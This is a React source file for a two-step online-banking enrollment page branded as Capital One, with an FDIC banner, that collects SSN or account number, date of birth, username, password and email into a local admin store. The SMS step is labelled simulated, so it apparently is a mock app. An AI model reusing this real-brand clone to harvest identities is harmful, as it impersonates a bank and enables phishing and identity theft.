import React, { useState } from 'react';
import { CapitalOneLogo } from '../components/CapitalOneLogo';
import { useAdminStore } from '../store/AdminStore';
import {
  ShieldCheck,
  ChevronDown,
  ArrowRight,
  ArrowLeft,
  Calendar,
  Lock,
  User as UserIcon,
  CheckCircle2,
} from 'lucide-react';

interface EnrollPageProps {
  onNavigate: (path: string) => void;
  isSecurityCheck?: boolean;
}

export const EnrollPage: React.FC<EnrollPageProps> = ({ onNavigate, isSecurityCheck = false }) => {
  const { setPendingUser, pendingUser, enrollUser } = useAdminStore();

  // Step 1: Personal Info
  const [lastName, setLastName] = useState(pendingUser?.lastName || '');
  const [ssnOrItin, setSsnOrItin] = useState(pendingUser?.ssn || '');
  const [dob, setDob] = useState(pendingUser?.dob || '');
  const [useAccountInstead, setUseAccountInstead] = useState(false);

  // Step 2: Credentials (security-check)
  const [firstName, setFirstName] = useState('');
  const [newUsername, setNewUsername] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [email, setEmail] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [referralCode, setReferralCode] = useState('');
  const [enrollSuccess, setEnrollSuccess] = useState(false);

  const handleStartEnrollment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!lastName || !ssnOrItin || !dob) return;

    setPendingUser({
      lastName,
      ssn: ssnOrItin,
      dob,
      useAccountInstead,
    });

    onNavigate('/enroll/security-check');
  };

  const handleCompleteSecurityCheck = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newUsername || !newPassword || !email) return;

    const chosenFirstName = firstName.trim() || 'Alex';
    enrollUser(newUsername, newPassword, chosenFirstName, email, referralCode);
    setEnrollSuccess(true);

    setTimeout(() => {
      onNavigate('/dashboard');
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-[#F4F6F8] flex flex-col justify-between text-[#1A1A1A]">
      {/* Header */}
      <div>
        {/* FDIC Banner */}
        <div className="bg-white border-b border-slate-200 py-2 px-4 text-xs text-slate-700">
          <div className="max-w-4xl mx-auto flex items-center justify-center sm:justify-start gap-2">
            <div className="w-4 h-4 rounded bg-slate-900 text-white flex items-center justify-center text-[9px] font-bold">
              FDIC
            </div>
            <span className="font-medium text-slate-700 text-[11px] sm:text-xs">
              FDIC-Insured - Backed by the full faith and credit of the U.S. Government
            </span>
          </div>
        </div>

        {/* Main Nav Bar */}
        <div className="bg-white border-b border-slate-200 py-3.5 px-4 shadow-xs">
          <div className="max-w-4xl mx-auto flex items-center justify-between">
            <button
              type="button"
              onClick={() => onNavigate('/')}
              className="flex items-center gap-2 cursor-pointer focus:outline-none"
            >
              <CapitalOneLogo className="h-8 sm:h-9" />
            </button>

            {/* Language Selector */}
            <div className="flex items-center gap-1.5 text-xs text-slate-700 font-semibold px-2 py-1 rounded hover:bg-slate-50 cursor-pointer">
              <span className="text-base leading-none">🇺🇸</span>
              <span>English</span>
              <ChevronDown className="w-3.5 h-3.5 text-slate-500" />
            </div>
          </div>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 my-8">
        <div className="w-full max-w-lg">
          {/* Back button */}
          <div className="mb-4">
            <button
              type="button"
              onClick={() => (isSecurityCheck ? onNavigate('/enroll') : onNavigate('/signin'))}
              className="text-xs font-semibold text-[#005C9D] hover:underline flex items-center gap-1 cursor-pointer"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>{isSecurityCheck ? 'Back to personal information' : 'Back to Sign In'}</span>
            </button>
          </div>

          {!isSecurityCheck ? (
            /* Step 1: Initial Enrollment Page */
            <div>
              {/* Intro Text */}
              <div className="text-left mb-6">
                <h2 className="text-2xl sm:text-3xl font-normal text-[#1A1A1A] tracking-tight">
                  Get started by telling us about you
                </h2>
                <p className="text-sm text-[#666666] mt-2">
                  To set up online access, we need to locate you in our system.
                </p>
              </div>

              {/* Main Card */}
              <div className="bg-white border border-slate-200 rounded-[8px] p-6 sm:p-8 shadow-[0_4px_20px_rgba(0,0,0,0.06)]">
                <h3 className="text-lg font-bold text-slate-900 mb-6">
                  Enter your personal information
                </h3>

                <form onSubmit={handleStartEnrollment} className="space-y-5">
                  {/* Last Name */}
                  <div>
                    <label className="block text-xs font-bold text-slate-700 mb-1.5">
                      Last Name
                    </label>
                    <input
                      type="text"
                      required
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      placeholder="e.g. Chen"
                      className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D] focus:border-transparent transition-all"
                    />
                  </div>

                  {/* SSN or ITIN */}
                  <div>
                    <label className="block text-xs font-bold text-slate-700 mb-1.5">
                      {useAccountInstead ? 'Bank Account Number' : 'Social Security Number or ITIN'}
                    </label>
                    <input
                      type="text"
                      required
                      value={ssnOrItin}
                      onChange={(e) => setSsnOrItin(e.target.value)}
                      placeholder={useAccountInstead ? 'Enter 10-12 digit account number' : '000000000'}
                      className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D] focus:border-transparent transition-all font-mono"
                    />
                    <button
                      type="button"
                      onClick={() => setUseAccountInstead(!useAccountInstead)}
                      className="text-xs text-[#005C9D] hover:underline font-semibold mt-1.5 inline-block cursor-pointer"
                    >
                      {useAccountInstead
                        ? 'Use Social Security Number or ITIN instead'
                        : 'Use bank account number instead'}
                    </button>
                  </div>

                  {/* Date of Birth */}
                  <div>
                    <label className="block text-xs font-bold text-slate-700 mb-1.5">
                      Date of Birth
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        required
                        value={dob}
                        onChange={(e) => setDob(e.target.value)}
                        placeholder="mm / dd / yyyy"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D] focus:border-transparent transition-all font-mono"
                      />
                      <Calendar className="w-4 h-4 text-slate-400 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                    </div>
                  </div>

                  {/* Primary CTA: "Get Started" */}
                  <button
                    type="submit"
                    className="w-full py-3.5 px-6 bg-[#005C9D] hover:bg-[#00487D] text-white font-bold text-base rounded-md transition-colors shadow-sm active:scale-98 cursor-pointer mt-4 flex items-center justify-center gap-2"
                  >
                    <span>Get Started</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </form>
              </div>
            </div>
          ) : (
            /* Step 2: Security Check / Set Credentials */
            <div>
              <div className="text-left mb-6">
                <h2 className="text-2xl sm:text-3xl font-normal text-[#1A1A1A] tracking-tight">
                  Verify your identity &amp; create credentials
                </h2>
                <p className="text-sm text-[#666666] mt-2">
                  We found your record for {pendingUser?.lastName || 'applicant'}. Create your secure sign-in details.
                </p>
              </div>

              <div className="bg-white border border-slate-200 rounded-[8px] p-6 sm:p-8 shadow-[0_4px_20px_rgba(0,0,0,0.06)]">
                {enrollSuccess ? (
                  <div className="text-center py-6 animate-in fade-in">
                    <CheckCircle2 className="w-12 h-12 text-emerald-600 mx-auto mb-3" />
                    <h3 className="text-xl font-bold text-slate-900">Online Access Created!</h3>
                    <p className="text-xs text-slate-500 mt-1 mb-4">
                      Your account is active. Redirecting you to your banking dashboard...
                    </p>
                  </div>
                ) : (
                  <form onSubmit={handleCompleteSecurityCheck} className="space-y-4">
                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">
                        First Name
                      </label>
                      <input
                        type="text"
                        required
                        value={firstName}
                        onChange={(e) => setFirstName(e.target.value)}
                        placeholder="e.g. Alex"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D]"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">
                        Choose a Username
                      </label>
                      <input
                        type="text"
                        required
                        value={newUsername}
                        onChange={(e) => setNewUsername(e.target.value)}
                        placeholder="e.g. alex.c2026"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D]"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">
                        Create a Password
                      </label>
                      <input
                        type="password"
                        required
                        value={newPassword}
                        onChange={(e) => setNewPassword(e.target.value)}
                        placeholder="Minimum 8 characters"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D]"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">
                        Email Address for Alerts
                      </label>
                      <input
                        type="email"
                        required
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="name@example.com"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D]"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">
                        Security Verification Code (Simulated SMS)
                      </label>
                      <input
                        type="text"
                        value={verificationCode}
                        onChange={(e) => setVerificationCode(e.target.value)}
                        placeholder="Enter 6-digit code (e.g. 849201)"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D] font-mono"
                      />
                      <span className="text-[11px] text-slate-400 mt-1 block">
                        We sent a code to the mobile number associated with your records.
                      </span>
                    </div>

                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <label className="text-xs font-bold text-slate-700">
                          Referral or Promo Code (Optional)
                        </label>
                        <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-1.5 py-0.5 rounded">
                          $500 Bonus
                        </span>
                      </div>
                      <input
                        type="text"
                        value={referralCode}
                        onChange={(e) => setReferralCode(e.target.value.toUpperCase())}
                        placeholder="e.g. CAPITAL500"
                        className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#005C9D] font-mono uppercase tracking-wider"
                      />
                      <span className="text-[11px] text-slate-500 mt-1 block leading-relaxed">
                        Accounts created with a referral code start with an opening balance of <strong>$500.00</strong>. Accounts created without a referral code start with <strong>$0.00</strong>.
                      </span>
                    </div>

                    <button
                      type="submit"
                      className="w-full py-3.5 px-6 bg-[#005C9D] hover:bg-[#00487D] text-white font-bold text-base rounded-md transition-colors shadow-sm active:scale-98 cursor-pointer mt-4 flex items-center justify-center gap-2"
                    >
                      <ShieldCheck className="w-5 h-5" />
                      <span>Complete Online Access Enrollment</span>
                    </button>
                  </form>
                )}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Footer: Standard links: Contact us, Legal, Privacy, Security, Terms & Conditions, Accessibility */}
      <div className="py-6 px-4 border-t border-slate-200 bg-white text-xs text-slate-600">
        <div className="max-w-4xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1.5 text-[11px]">
            <a href="#contact" onClick={(e) => e.preventDefault()} className="hover:text-[#005C9D]">
              Contact us
            </a>
            <span aria-hidden="true">·</span>
            <a href="#legal" onClick={(e) => e.preventDefault()} className="hover:text-[#005C9D]">
              Legal
            </a>
            <span aria-hidden="true">·</span>
            <a href="#privacy" onClick={(e) => e.preventDefault()} className="hover:text-[#005C9D]">
              Privacy
            </a>
            <span aria-hidden="true">·</span>
            <a href="#security" onClick={(e) => e.preventDefault()} className="hover:text-[#005C9D]">
              Security
            </a>
            <span aria-hidden="true">·</span>
            <a href="#terms" onClick={(e) => e.preventDefault()} className="hover:text-[#005C9D]">
              Terms &amp; Conditions
            </a>
            <span aria-hidden="true">·</span>
            <a href="#accessibility" onClick={(e) => e.preventDefault()} className="hover:text-[#005C9D]">
              Accessibility
            </a>
          </div>

          <div className="text-[11px] text-slate-400">
            &copy;2026 Capital One · Member FDIC
          </div>
        </div>
      </div>
    </div>
  );
};
